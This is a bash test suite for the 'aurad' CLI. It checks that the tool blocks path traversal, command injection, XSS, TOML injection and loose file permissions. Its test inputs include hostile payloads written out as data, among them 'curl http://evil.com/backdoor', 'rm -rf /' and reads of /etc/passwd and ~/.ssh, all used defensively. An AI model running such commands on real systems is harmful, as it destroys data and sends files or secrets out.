#!/bin/bash
# AURA CLI Security Test Suite
# Tests all security implementations to verify protection against attacks

set -e

RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
NC='\033[0m' # No Color

PASSED=0
FAILED=0
TOTAL=0

# Test result tracking
test_result() {
    local name=$1
    local result=$2
    TOTAL=$((TOTAL + 1))

    if [ "$result" == "PASS" ]; then
        echo -e "${GREEN}✓${NC} $name"
        PASSED=$((PASSED + 1))
    else
        echo -e "${RED}✗${NC} $name"
        FAILED=$((FAILED + 1))
    fi
}

# Check if aurad binary exists
if ! command -v aurad &> /dev/null; then
    echo -e "${RED}ERROR: aurad binary not found. Please build first.${NC}"
    exit 1
fi

echo "================================================"
echo "AURA CLI Security Test Suite"
echo "================================================"
echo ""

# ============================================
# 1. PATH TRAVERSAL TESTS
# ============================================
echo "1. Testing Path Traversal Protection..."
echo "----------------------------------------"

# Test 1.1: Relative path traversal
if aurad init --home "../../../etc/passwd" test-node 2>&1 | grep -q "invalid.*path\|path.*invalid\|outside.*allowed"; then
    test_result "Path traversal with ../ blocked" "PASS"
else
    test_result "Path traversal with ../ blocked" "FAIL"
fi

# Test 1.2: Absolute path outside home
if aurad init --home "/etc" test-node 2>&1 | grep -q "invalid.*path\|path.*invalid\|outside.*allowed"; then
    test_result "Absolute path to /etc blocked" "PASS"
else
    test_result "Absolute path to /etc blocked" "FAIL"
fi

# Test 1.3: SSH directory access
if aurad init --home "~/.ssh" test-node 2>&1 | grep -q "invalid.*path\|path.*invalid\|suspicious"; then
    test_result "SSH directory access blocked" "PASS"
else
    test_result "SSH directory access blocked" "FAIL"
fi

# Test 1.4: Null byte in path
if aurad init --home $'/tmp/test\x00evil' test-node 2>&1 | grep -q "invalid.*path\|null.*byte"; then
    test_result "Null byte in path blocked" "PASS"
else
    test_result "Null byte in path blocked" "FAIL"
fi

echo ""

# ============================================
# 2. COMMAND INJECTION TESTS
# ============================================
echo "2. Testing Command Injection Protection..."
echo "----------------------------------------"

# Create test directory
TEST_DIR=$(mktemp -d)
trap "rm -rf $TEST_DIR" EXIT

# Test 2.1: Semicolon command separator
cat > "$TEST_DIR/test1.txt" << 'EOF'
query status; rm -rf /
EOF

if aurad batch "$TEST_DIR/test1.txt" 2>&1 | grep -q "invalid.*command\|not.*allowed\|disallowed.*character"; then
    test_result "Semicolon command separator blocked" "PASS"
else
    test_result "Semicolon command separator blocked" "FAIL"
fi

# Test 2.2: Pipe operator
cat > "$TEST_DIR/test2.txt" << 'EOF'
query status | curl http://evil.com
EOF

if aurad batch "$TEST_DIR/test2.txt" 2>&1 | grep -q "invalid.*command\|not.*allowed\|disallowed.*character"; then
    test_result "Pipe operator blocked" "PASS"
else
    test_result "Pipe operator blocked" "FAIL"
fi

# Test 2.3: Command substitution
cat > "$TEST_DIR/test3.txt" << 'EOF'
query status $(whoami)
EOF

if aurad batch "$TEST_DIR/test3.txt" 2>&1 | grep -q "invalid.*command\|not.*allowed\|disallowed.*character"; then
    test_result "Command substitution blocked" "PASS"
else
    test_result "Command substitution blocked" "FAIL"
fi

# Test 2.4: Background execution
cat > "$TEST_DIR/test4.txt" << 'EOF'
query status & curl http://evil.com
EOF

if aurad batch "$TEST_DIR/test4.txt" 2>&1 | grep -q "invalid.*command\|not.*allowed\|disallowed.*character"; then
    test_result "Background execution blocked" "PASS"
else
    test_result "Background execution blocked" "FAIL"
fi

# Test 2.5: Suspicious command (rm)
cat > "$TEST_DIR/test5.txt" << 'EOF'
rm -rf /important/data
EOF

if aurad batch "$TEST_DIR/test5.txt" 2>&1 | grep -q "invalid.*command\|not.*allowed\|suspicious"; then
    test_result "Suspicious command (rm) blocked" "PASS"
else
    test_result "Suspicious command (rm) blocked" "FAIL"
fi

# Test 2.6: Suspicious command (curl)
cat > "$TEST_DIR/test6.txt" << 'EOF'
curl http://evil.com/backdoor
EOF

if aurad batch "$TEST_DIR/test6.txt" 2>&1 | grep -q "invalid.*command\|not.*allowed\|suspicious"; then
    test_result "Suspicious command (curl) blocked" "PASS"
else
    test_result "Suspicious command (curl) blocked" "FAIL"
fi

echo ""

# ============================================
# 3. INPUT VALIDATION TESTS
# ============================================
echo "3. Testing Input Validation..."
echo "----------------------------------------"

# Test 3.1: Invalid chain-id with special characters
if aurad init --chain-id "aura-1; rm -rf /" test-node --home "$TEST_DIR/test1" 2>&1 | grep -q "invalid.*chain.*id"; then
    test_result "Chain-ID with semicolon blocked" "PASS"
else
    test_result "Chain-ID with semicolon blocked" "FAIL"
fi

# Test 3.2: Control characters in moniker
if aurad init --moniker $'test\x00node' --home "$TEST_DIR/test2" 2>&1 | grep -q "invalid.*moniker\|control.*character"; then
    test_result "Moniker with control characters blocked" "PASS"
else
    test_result "Moniker with control characters blocked" "FAIL"
fi

# Test 3.3: XSS in moniker
if aurad init --moniker "test<script>alert(1)</script>" --home "$TEST_DIR/test3" 2>&1 | grep -q "invalid.*moniker"; then
    test_result "Moniker with XSS blocked" "PASS"
else
    test_result "Moniker with XSS blocked" "FAIL"
fi

# Test 3.4: Too long chain-id (>64 chars)
LONG_CHAIN_ID=$(python3 -c "print('a' * 100)")
if aurad init --chain-id "$LONG_CHAIN_ID" test-node --home "$TEST_DIR/test4" 2>&1 | grep -q "invalid.*chain.*id\|too.*long"; then
    test_result "Overly long chain-ID blocked" "PASS"
else
    test_result "Overly long chain-ID blocked" "FAIL"
fi

# Test 3.5: Too long moniker (>128 chars)
LONG_MONIKER=$(python3 -c "print('a' * 200)")
if aurad init --moniker "$LONG_MONIKER" --home "$TEST_DIR/test5" 2>&1 | grep -q "invalid.*moniker\|too.*long"; then
    test_result "Overly long moniker blocked" "PASS"
else
    test_result "Overly long moniker blocked" "FAIL"
fi

echo ""

# ============================================
# 4. CONFIG VALIDATION TESTS
# ============================================
echo "4. Testing Config Validation..."
echo "----------------------------------------"

# Initialize a test node for config tests
aurad init --home "$TEST_DIR/config-test" test-config-node &> /dev/null || true

# Test 4.1: Unknown config key
if aurad config set --home "$TEST_DIR/config-test" "unknown.malicious.key" "value" 2>&1 | grep -q "invalid.*key\|not.*allowed"; then
    test_result "Unknown config key blocked" "PASS"
else
    test_result "Unknown config key blocked" "FAIL"
fi

# Test 4.2: TOML injection
if aurad config set --home "$TEST_DIR/config-test" $'chain-id\n[malicious]' "evil" 2>&1 | grep -q "invalid.*key\|invalid.*value\|injection"; then
    test_result "TOML injection blocked" "PASS"
else
    test_result "TOML injection blocked" "FAIL"
fi

# Test 4.3: Invalid boolean value
if aurad config set --home "$TEST_DIR/config-test" "grpc.enable" "not-a-boolean" 2>&1 | grep -q "invalid.*value"; then
    test_result "Invalid boolean value blocked" "PASS"
else
    test_result "Invalid boolean value blocked" "FAIL"
fi

# Test 4.4: Path traversal in config key
if aurad config set --home "$TEST_DIR/config-test" "../../etc/passwd" "value" 2>&1 | grep -q "invalid.*key"; then
    test_result "Path traversal in config key blocked" "PASS"
else
    test_result "Path traversal in config key blocked" "FAIL"
fi

echo ""

# ============================================
# 5. FILE PERMISSION TESTS
# ============================================
echo "5. Testing File Permissions..."
echo "----------------------------------------"

# Initialize a test node to check permissions
PERM_TEST_DIR="$TEST_DIR/perm-test"
aurad init --home "$PERM_TEST_DIR" test-perm-node &> /dev/null

# Test 5.1: Keys directory permissions (should be 0700)
if [ -d "$PERM_TEST_DIR/keys" ]; then
    PERMS=$(stat -c "%a" "$PERM_TEST_DIR/keys" 2>/dev/null || stat -f "%A" "$PERM_TEST_DIR/keys" 2>/dev/null)
    if [ "$PERMS" == "700" ]; then
        test_result "Keys directory has secure permissions (0700)" "PASS"
    else
        test_result "Keys directory has secure permissions (got: $PERMS)" "FAIL"
    fi
else
    test_result "Keys directory exists" "FAIL"
fi

# Test 5.2: Data directory permissions (should be 0700)
if [ -d "$PERM_TEST_DIR/data" ]; then
    PERMS=$(stat -c "%a" "$PERM_TEST_DIR/data" 2>/dev/null || stat -f "%A" "$PERM_TEST_DIR/data" 2>/dev/null)
    if [ "$PERMS" == "700" ]; then
        test_result "Data directory has secure permissions (0700)" "PASS"
    else
        test_result "Data directory has secure permissions (got: $PERMS)" "FAIL"
    fi
else
    test_result "Data directory exists" "FAIL"
fi

# Test 5.3: Config directory permissions (should be 0750)
if [ -d "$PERM_TEST_DIR/config" ]; then
    PERMS=$(stat -c "%a" "$PERM_TEST_DIR/config" 2>/dev/null || stat -f "%A" "$PERM_TEST_DIR/config" 2>/dev/null)
    if [ "$PERMS" == "750" ]; then
        test_result "Config directory has secure permissions (0750)" "PASS"
    else
        test_result "Config directory has secure permissions (got: $PERMS)" "FAIL"
    fi
else
    test_result "Config directory exists" "FAIL"
fi

# Test 5.4: Config file permissions (should be 0640)
if [ -f "$PERM_TEST_DIR/config/config.toml" ]; then
    PERMS=$(stat -c "%a" "$PERM_TEST_DIR/config/config.toml" 2>/dev/null || stat -f "%A" "$PERM_TEST_DIR/config/config.toml" 2>/dev/null)
    if [ "$PERMS" == "640" ]; then
        test_result "Config file has secure permissions (0640)" "PASS"
    else
        test_result "Config file has secure permissions (got: $PERMS)" "FAIL"
    fi
else
    test_result "Config file exists" "FAIL"
fi

echo ""

# ============================================
# 6. SCRIPT VALIDATION TESTS
# ============================================
echo "6. Testing Script Validation..."
echo "----------------------------------------"

# Test 6.1: Variable injection in script
cat > "$TEST_DIR/script1.txt" << 'EOF'
SET ADDR=aura1test; rm -rf /
query bank balances $ADDR
EOF

if aurad script "$TEST_DIR/script1.txt" 2>&1 | grep -q "invalid.*variable\|invalid.*command\|disallowed"; then
    test_result "Variable injection in script blocked" "PASS"
else
    test_result "Variable injection in script blocked" "FAIL"
fi

# Test 6.2: Command substitution in variable
cat > "$TEST_DIR/script2.txt" << 'EOF'
SET EVIL=$(whoami)
query status
EOF

if aurad script "$TEST_DIR/script2.txt" 2>&1 | grep -q "invalid.*variable\|disallowed.*character"; then
    test_result "Command substitution in variable blocked" "PASS"
else
    test_result "Command substitution in variable blocked" "FAIL"
fi

# Test 6.3: Invalid variable name
cat > "$TEST_DIR/script3.txt" << 'EOF'
SET 1INVALID=value
query status
EOF

if aurad script "$TEST_DIR/script3.txt" 2>&1 | grep -q "invalid.*variable\|invalid.*SET"; then
    test_result "Invalid variable name blocked" "PASS"
else
    test_result "Invalid variable name blocked" "FAIL"
fi

echo ""

# ============================================
# SUMMARY
# ============================================
echo "================================================"
echo "Security Test Suite Results"
echo "================================================"
echo -e "Total Tests:  $TOTAL"
echo -e "Passed:       ${GREEN}$PASSED${NC}"
echo -e "Failed:       ${RED}$FAILED${NC}"
echo ""

if [ $FAILED -eq 0 ]; then
    echo -e "${GREEN}All security tests passed! ✓${NC}"
    echo ""
    echo "Security Status: SECURE"
    exit 0
else
    echo -e "${RED}Some security tests failed! ✗${NC}"
    echo ""
    echo "Security Status: VULNERABLE"
    exit 1
fi
